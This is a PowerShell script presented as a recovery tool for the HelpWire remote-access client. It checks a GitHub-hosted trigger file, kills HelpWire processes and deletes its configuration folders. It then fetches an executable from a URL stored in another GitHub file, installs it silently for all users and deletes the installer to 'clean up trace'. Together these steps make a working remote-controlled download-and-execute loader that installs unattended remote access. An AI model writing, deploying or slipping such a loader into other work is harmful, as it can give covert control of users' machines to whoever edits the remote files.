# --- CONFIGURATION ---
# Replace these with the RAW URLs from your actual GitHub repository
$TriggerUrl   = "https://raw.githubusercontent.com/drwiiche/drwiiche.github.io/refs/heads/master/trigger.txt"
$GitHubTxtUrl = "https://raw.githubusercontent.com/drwiiche/drwiiche.github.io/refs/heads/master/helpwire_link.txt"
$DownloadDir  = "$env:TEMP\HelpWireRecovery"
$ExePath      = "$DownloadDir\HelpWireClient.exe"

try {
    # 1. Pull the trigger status straight from GitHub (bypass local web cache)
    $Status = (Invoke-WebRequest -Uri "$TriggerUrl?v=$(Get-Random)" -UseBasicParsing).Content.Trim()

    # If it doesn't say RUN, stop immediately and use zero resources
    if ($Status -ne "RUN") {
        exit 0
    }

    Write-Host "Manual trigger 'RUN' detected! Rebuilding HelpWire..." -ForegroundColor Yellow

    # 2. Kill any stuck, unresponsive, or altered HelpWire processes
    Get-Process -Name "*HelpWire*" -ErrorAction SilentlyContinue | Stop-Process -Force

    # 3. Wipe configuration caches so the new unattended token registers flawlessly
    $AppDataPaths = @(
        "$env:ProgramData\HelpWire",
        "$env:AppData\HelpWire",
        "$env:LocalAppData\HelpWire"
)
    foreach ($Path in $AppDataPaths) {
        if (Test-Path $Path) { 
            Remove-Item -Path $Path -Recurse -Force -ErrorAction SilentlyContinue 
        }
    }

    # 4. Prep the temp directory
    if (-not (Test-Path $DownloadDir)) { 
        New-Item -ItemType Directory -Path $DownloadDir | Out-Null 
    }

    # 5. Fetch the fresh deployment link
    $DownloadUrl = (Invoke-WebRequest -Uri "$GitHubTxtUrl?v=$(Get-Random)" -UseBasicParsing).Content.Trim()
    if ([string]::IsNullOrEmpty($DownloadUrl) -or $DownloadUrl -notlike "http*") { 
        Write-Error "Invalid URL string in helpwire_link.txt"
        exit 1 
    }

    # 6. Download and run silent installation
    Write-Host "Downloading fresh client..."
    Invoke-WebRequest -Uri $DownloadUrl -OutFile $ExePath -UseBasicParsing

    if (Test-Path $ExePath) {
        Write-Host "Running silent installation..."
        Start-Process -FilePath $ExePath -ArgumentList "/S", "/allusers", "/quiet" -Wait -NoNewWindow
        Write-Host "Deployment complete." -ForegroundColor Green
    }

} catch {
    Write-Error "Execution failed: $_"
} finally {
    # Clean up trace
    if (Test-Path $ExePath) { 
        Remove-Item -Path $ExePath -Force -ErrorAction SilentlyContinue 
    }
}
